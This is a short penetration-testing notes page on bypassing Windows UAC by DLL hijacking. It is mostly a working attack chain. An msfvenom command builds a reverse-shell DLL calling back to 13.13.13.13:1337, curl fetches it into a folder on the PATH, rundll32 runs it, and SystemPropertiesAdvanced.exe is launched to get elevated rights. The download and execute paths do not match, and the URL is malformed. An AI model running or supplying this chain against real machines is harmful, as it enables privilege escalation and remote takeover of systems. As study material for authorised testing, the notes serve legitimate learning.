# UAC Bypass

## <mark style="color:yellow;">About</mark>

More about UAC in theory you can read here **\[LINK]**

Here you would be looking more into UAC Bypasses, because every account. even elevated one have two types of tokens, low and high privilege. And sometimes after we got some high-privilege user we need to bypass UAC to actually use high-privilege token. Here I would write about UAC techniques I used during machines or engagements.&#x20;

<mark style="color:orange;">**Very useful is UACME repository**</mark> [**\[LINK\]**](https://github.com/hfiref0x/UACME)

<mark style="color:orange;">**Also this repo is useful**</mark> [**\[LINK\]**](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)

## <mark style="color:blue;">UAC Bypass with DLL Hijacking</mark>

#### Review Path Variable

```powershell
PS C:/> cmd /c echo %PATH%
```

#### Generate Malicious DLL

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=13.13.13.13 LPORT=1337 -f dll > srrstr.dll
```

#### Download DLL

```powershell
curl http:/13.13.13.13:1337/srrstr.dll -O "C:\Users\ven17\AppData\Local\Microsoft\Windows Apps\srrstr.dll"
```

#### Execute Malicious DLL on Target

```powershell
rundll32 shell32.dll,Control_RunDLL C:\Users\ven17\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

#### Ensure No Existing rundll32 Instances

```powershell
tasklist /svc | findstr "rundll32"
taskkill /PID <PID> /F
```

#### Execute <mark style="color:green;">SystemPropertiesAdvanced.exe</mark> for UAC Bypass

```powershell
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

#### Verify Elevated Privileges

```powershell
whoami /priv
```
